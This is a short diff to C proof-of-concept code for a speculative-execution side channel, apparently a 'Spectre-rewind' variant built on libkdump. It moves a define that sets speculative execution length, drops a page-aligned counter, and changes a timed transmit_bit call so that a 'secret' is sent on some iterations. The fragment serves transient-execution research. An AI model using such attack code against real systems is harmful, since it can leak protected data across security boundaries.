@@ -40,6 +40,7 @@
 /**************************************************************************
  * Public Definitions
  **************************************************************************/
+#define N_DIVS 12   // determine speculative execution length
 
 /**************************************************************************
  * Public Types
@@ -52,7 +53,8 @@ typedef struct {
  * Global Variables
  **************************************************************************/
 static int dbg = 1;
-static volatile uint64_t counter __attribute__((aligned(4096))) = 0;
+// static volatile uint64_t counter __attribute__((aligned(4096))) = 0; // <-- doesn't work. why?
+static volatile uint64_t counter = 0;
 static libkdump_config_t config;
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 static pthread_t count_thread;
@@ -146,7 +148,6 @@ struct div_test *test_tasks[] = {
     &transmit_1,
 };
 
-#define N_DIVS 12   // determine speculative execution length
 
 int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
 {
@@ -234,7 +235,7 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
       for (volatile int iter = 0; iter < 13; iter++); // IMPORTANT: add delay (> 13).
         
       start = rdtsc();
-      transmit_bit(test_tasks[i], 0); // send secret when (i%8==7).
+      transmit_bit(test_tasks[i], i%8); // send secret when (i%8==7).
       end = rdtsc();
       
       dur = end - start;
